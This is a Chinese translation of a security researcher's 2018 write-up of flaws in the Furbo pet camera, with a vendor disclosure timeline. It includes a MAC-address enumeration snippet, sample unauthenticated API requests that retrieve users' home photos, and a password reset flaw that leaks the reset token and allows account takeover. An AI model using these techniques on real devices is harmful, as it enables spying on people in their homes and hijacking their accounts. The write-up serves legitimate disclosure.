# Furbo 宠物智能喂食器可导致用户被窥视的漏洞分析

阅读量 **192943**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-06-21 15:05:16

 **x**

##### 译文声明

本文是翻译文章，文章来源：lethalbit.com

原文地址：<https://lethalbit.com/furbo/>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t0118c6139a3fc0ace3.jpg)

## TL;DR

缺乏足够的访问控制和授权，API中使用可预测的设备ID，以及密码重置机制的缺陷，都可能使Furbo所有用户的[视频](https://lethalbit.com/furbo/#takeover)、[家庭私密照片](https://lethalbit.com/furbo/#photos)、[语音消息](https://lethalbit.com/furbo/#audioleak)被攻击者访问，攻击者甚至可以[把食物扔给用户的宠物](https://lethalbit.com/furbo/#takeover)。

## 背景

在即将播出的一集McAfee的[Hackable](http://hackablepodcast.com/)
podcast中，我拿到了一台Furbo（一种狗食投掷装置）用于安全评估。FURBO是一款狗用的拥有相机功能，可以通过你的手机按一下按钮就能把食物扔出去的机器，是在工作或度假时看狗的好方法。

目前，Furbo是亚马逊上最畅销的狗摄像头，售价在250美元到300美元之间。

Furbo曾多次出现在媒体上，比如“纽约时报”、“技术快报”和最近的“[艾伦脱口秀](https://www.youtube.com/watch?v=nqug-3O8hC4)”，他们在节目中向观众赠送Furbo作为圣诞礼物。

艾伦脱口秀上的Furbo：<https://youtu.be/nqug-3O8hC4>

## Furbo的特点

Furbo配备了高清摄像头，夜视功能，双向音频(你可以和你的狗说话，听到它的吠声)AI智能狗识别技术，以及一个应用程序，让你与设备互动。以下是其中一些特点：

[](https://p2.ssl.qhimg.com/t016bc2742330181a7a.jpg)

## Furbo的高级特征：Smart Dog Alerts

Furbo有一个叫做“Smart Dog Alerts  
”的高级功能，每当AI发现你的狗有异常活动或希望得到关注时，它会发送通知到你的电话。这个功能在默认情况下是打开的。

一旦发生了一些活动，Furbo将弹出一个带有触发器描述的通知：

[](https://p5.ssl.qhimg.com/t01a1a580d7916dc590.jpg)

## 这背后发生了什么

Furbo通过蓝牙进行设备的初始设置，并使用[实时流媒体协议(RTSP)-RFC2326](https://tools.ietf.org/html/rfc2326)传输视频流。通过RTSPS将视频流发送到不同区域的多个IP地址，每一张由SmartDog
Alerts功能拍摄的照片都被上传到Amazon S3中。

Furbo的移动应用程序从他们的云服务下载你的照片，一旦你浏览到主页，它们就会被填充到Furbo日常的“时间线”中，就是当天发生的所有事件。

[](https://p5.ssl.qhimg.com/t01ba089cca264e9cf5.jpg)

## 远程攻击的Furbo

###  访问你所有的照片

问题在于移动应用程序执行的API调用之一，即在打开App时接收当天的事件。

事件是由设备拍摄的照片/瞬间，这些照片/瞬间后面会被归类为“人”、“狗自拍”和“狗活动”。

时间线由使用值为当前日期的LocalTime参数的POST请求发送。然后，该响应将包含3个不同的键：PersonDetected
DogMoveAbove10secs和Selfie，如果日期有效并且照片是当天拍摄的，这些最终将是客户的照片。

这个API在请求中需要一个有效的MAC地址，但是没有会话令牌或任何类似的东西。获得有效的MAC地址并不困难，因为相机是由台湾的一家名为Chicony
Electronics的制造商生产的，而且它们的地址是以B0：c0：90为前缀的。

通过生成MAC地址字典，并且考虑到MAC是一个注册设备，响应将包括在localtime参数中指定的当天的Amazon S3的图像链接。

以下代码可用于生成随机MAC地址：

    
    
    >>> for _ in range(200): print "%s:%02x:%02x:%02x" %('B0:C0:90', random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
    ... 
    B0:C0:90:74:c5:d6
    B0:C0:90:02:64:85
    B0:C0:90:ab:3e:a4
    B0:C0:90:00:1c:5f
    B0:C0:90:bf:fc:e3
    B0:C0:90:94:d7:8a
    B0:C0:90:5c:b3:86
    B0:C0:90:b0:57:c7
    B0:C0:90:ca:37:b0
    

攻击请求示例:

    
    
    POST /endpoint HTTP/1.1
    Cache-Control: no-cache
    Content-Type: application/json
    User-Agent: FurboApp/3.1.1 (Linux; U; Android 6.0.1; en; samsung/SM-J120W) ROM/0.1.0.0 (samsung; 32011752d4df54a1)
    Authorization: Basic 
    Content-Length: 942
    Host: hostname
    Connection: close
    
    {"LocalTime":"2018-03-08 00:27:17"}
    

响应示例:

    
    
    {
      "EventTypes": [
        {
          "Count": 70, 
          "Type": "DogMoveAbove10Sec"
        }, 
        {
          "Count": 5, 
          "Type": "PersonDetection"
        }, 
        {
          "Count": 1, 
          "Type": "Selfie"
        }
      ], 
      "Events": [
        {
          "LocalTime": "2018-03-02 23:22:41", 
          "OriginImg": "https://redacted.s3.amazonaws.com/*******************?AWSAccessKeyId=*********&x-amz-security-token=**********", 
          "Thumbnail": "https://redacted.s3.amazonaws.com/*******************?AWSAccessKeyId=*********&x-amz-security-token=**********", 
          "Type": "DogMoveAbove10Sec"
        }, 
        {
          "LocalTime": "2018-03-02 23:20:19", 
          "OriginImg": "https://redacted.s3.amazonaws.com/*******************?AWSAccessKeyId=*********&x-amz-security-token=**********", 
          "Thumbnail": "https://redacted.s3.amazonaws.com/*******************?AWSAccessKeyId=*********&x-amz-security-token=**********", 
          "Type": "DogMoveAbove10Sec"
        }, 
        {
         "LocalTime": "2018-03-02 21:34:10", 
          "OriginImg": "https://redacted.amazonaws.com/*******************?AWSAccessKeyId=*********&x-amz-security-token=**********", 
          "Thumbnail": "https://redacted.amazonaws.com/*******************?AWSAccessKeyId=*********&x-amz-security-token=**********", 
          "Type": "PersonDetection"
        }, 
        ]
    }
    

虽然默认情况下启用了Smart Dog Alerts，但是应用程序让你通过设置页面自定义要捕获的智能警报。

[](https://p2.ssl.qhimg.com/t0136947a09486c3074.png)

可以使用这个API调用来获得设备的设置，而不是枚举设备。其中包括设置，如是否启用了“Smart Dog
Alerts”功能。这将允许更加快速的攻击，但只针对启用了易受攻击组件的设备。

获取设备设置的API调用示例：

    
    
    GET /endpoint HTTP/1.1
    Host: hostname
    Connection: close
    User-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)
    
    
    HTTP/1.1 200 OK
    Date: Wed, 07 Mar 2018 17:46:29 GMT
    Content-Type: application/json
    Content-Length: 76
    Connection: close
    Server: Apache/2.4.18 (Ubuntu)
    
    {
      "DogMoveAbove10Sec": "1", 
      "PersonDetection": "1", 
      "Selfie": "1"
    }
    

1表示已启用，0表示已禁用。

## 收集要攻击的设备

使用目前为止我们所知道的，并且使用这个逻辑，可以保证在多线程的情况下几分钟内获得数百个客户的数据。

[](https://p5.ssl.qhimg.com/t0164b33f68528d05bc.png "枚举Furbo帐户")

## 最可怕的是

[](https://p4.ssl.qhimg.com/t01108e497fb1ed817b.png "夜间图片")

[](https://p3.ssl.qhimg.com/t014ea79b7e8e3a216c.jpg "我的两只猫")

[](https://p5.ssl.qhimg.com/t01296c29bcfd94d404.jpg
"我在清理使用Furbo抛投功能后那些乱七八糟的东西")

这时候，我开始寻找与谁联系来报告这个问题。

## 获取你所有的录音

###  FURBO的旗舰特色：抛投

Furbo的真正价值在于其投掷的特征，这其实是相当巧妙的。

在产品的正中间，有一个小洞和一个机制，一旦你使用应用程序的投掷功能它会从容器重新装载食物然后投掷。我有猫，所以这里有一个视频，看它如何与猫互动的：

视频：<https://lethalbit.com/furbo/images/tossing.mp4>

但是狗怎么知道你什么时候要扔食物呢？问得好！Snack！

###  Snack

Snack是一种声音，在你滑动投掷食物时播放。让我们来记录一条6秒的消息，或者使用默认的内置声音。

[](https://p0.ssl.qhimg.com/t014dc05cfb86268a43.png)

该特性与视频缺陷相同，使用API上传音频，然后提供直接的S3链接。与视频没有什么不同，它只使用基本的auth，这可能导致允许攻击者访问用户的音频文件。

音频：<https://lethalbit.com/furbo/images/treat_toss.wav>

我没有足够的时间来进一步探讨这个功能，因为我披露后供应商快速反应，取消了服务。但是，上传文件时调用的音频HTTP PUT请求可能也是易受攻击的。

从理论上讲，我可以把我自己的声音文件上传到用户的Furbo。

## 全天候跟踪你

###  完全接管帐户

我看了一下如何重新设置帐户密码。

在“密码重置”页上，当你重置帐户的密码时，它会调用发送电子邮件API。然后，响应就是一个令牌。我把它记下来以备后用。

密码重置请求：

    
    
    POST /send-email HTTP/1.1
    Host: host
    Connection: close
    Content-Length: 47
    Accept: application/json, text/javascript, */*; q=0.01
    Origin: hostname
    X-Requested-With: XMLHttpRequest
    User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; SM-J120W Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36
    Content-Type: application/json
    Accept-Encoding: gzip, deflate
    Accept-Language: en-CA,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
    
    {"Email":"someuser@someemail.com","Locale":"en-US"}
    

密码重置响应:

    
    
    HTTP/1.1 200 OK
    Date: Sat, 10 Mar 2018 13:33:58 GMT
    Content-Type: application/json
    Content-Length: 69
    Connection: close
    Server: Werkzeug/0.12.2 Python/3.5.2
    
    {"Message":"IkhQTFRaU[redacted]VjIEly2XUWdVMAh8"}
    

不出所料，我收到了一封电子邮件，里面有一个链接，可以重新设置我的密码。我看到了以下内容：

[](https://p5.ssl.qhimg.com/t01ba3dff378a7aca1a.png)

接着，我点击了链接，突然发现地址栏里有一些看起来很熟悉的东西。

[](https://p1.ssl.qhimg.com/t01b2c7429106ca0a29.png)

地址栏中的令牌与我之前记下的令牌相同！这意味着我可以重新设置任何Furbo的帐户密码，而不需要访问受害者的电子邮件帐户！

到目前为止，我们只能访问静态照片和音频记录。但这允许我以其他人的身份登录。这使我可以执行以下任何一项操作：

  * 观看你的生活
  * 听到你说话
  * 跟你说话
  * 查看你的历史照片数据
  * 扔食物给你的宠物

FURBO设备接管DEMO：  
<https://lethalbit.com/furbo/images/full_account_takeover.mp4>

## 联系Furbo

  * 2018年3月2日-我寻找联系Furbo的方法。在多个平台上给他们发短信后，他们的客户支持经理联系了我寻求更多细节。随后，Furbo技术小组着手调查该报告。
  * 2018年3月2日-我被告知已经推送修复，但显然，它没有解决我报告的问题。
  * 2018年3月4日-Furbo打电话给我，要求提供漏洞证明。他们寄给我一个他们的设备的MAC地址，让我告诉他们那里有哪些照片。结果是：[](https://p5.ssl.qhimg.com/t011ed8d4d5935e377e.jpg)
  * 2018年3月4日-Furbo公司暂停该功能。API调用已经修复。
  * 2018年3月7日-我联系了Furbo，让他们知道Snack呼叫功能中的语音记录漏洞。
  * 2018年3月7日-Furbo更新说，他们将暂停Snack Call功能，直到新版本发布。
  * 2018年3月9日-发布了一个新的应用程序版本，它修复了视频和语音记录API中的漏洞。
  * 2018年3月12日-我联系了Furbo，让他们知道账户的接管情况。他们给了我一个电子邮件账户，我证明了报告的有效性。以下是一张在Furbo总部办公室拍摄的照片：![][](https://p0.ssl.qhimg.com/t01bd6052d92af26eb8.jpg)
  * 2018年3月12日-我们接到电话，证实问题似乎已经解决。此时所有提到的漏洞都得到了解决。
  * 2018年3月15日-我联系了Furbo，发现了另一个漏洞
  * 2018年3月20日-Furbo通报说，将在下一次固件升级中推出一个补丁。
  * 2018年3月20日-奖励：Pet food basket(我谢绝了)。
  * 2018年6月16日-公开发行

## 注意

Furbo团队非常迅速地处理报告和修复缺陷。根据我的建议，他们决定取消服务以防止更多的潜在风险，考虑到目前的情况，这是正确的做法。

## 联系方式

如有任何问题，请通过电子邮件 d.farhi#lethalbit.com
或[twitter](https://twitter.com/dolevfarhi)与我联系

审核人：yiwang 编辑：边边

本文翻译自lethalbit.com [原文链接](https://lethalbit.com/furbo/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **秋真平** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/148499](/post/id/148499)

安全客 - 有思想的安全新媒体

本文转载自: [lethalbit.com](https://lethalbit.com/furbo/)

如若转载,请注明出处： <https://lethalbit.com/furbo/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)
  * [安全研究](/tag/安全研究)
  * [IOT安全](/tag/IOT安全)
  * [智能摄像头](/tag/智能摄像头)

 **+1** __1赞

 __收藏

![](https://p3.ssl.qhimg.com/t010857340ce46bb672.jpg) 秋真平

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

